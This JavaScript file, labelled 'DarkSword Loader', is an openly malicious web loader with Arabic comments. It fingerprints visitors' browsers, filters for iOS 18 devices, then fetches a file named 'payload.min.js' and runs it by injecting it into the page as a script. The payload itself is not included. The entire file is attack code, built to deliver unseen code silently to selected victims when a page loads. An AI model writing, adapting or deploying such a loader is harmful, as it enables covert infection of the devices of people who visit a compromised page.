// DarkSword Loader - Obfuscated
(function() {
    'use strict';
    
    const fingerprint = {
        ua: navigator.userAgent,
        ios: /iPad|iPhone|iPod/.test(navigator.platform),
        version: navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/) || [0,0,0]
    };

    if (!fingerprint.ios || parseInt(fingerprint.version[1]) < 18 || parseInt(fingerprint.version[1]) > 18.7) {
        return; // هدف غير مناسب
    }

    // تحميل الـ Payload الرئيسي
    fetch('payload.min.js')
        .then(r => r.text())
        .then(code => {
            const script = document.createElement('script');
            script.textContent = code;
            document.head.appendChild(script);
        });
})();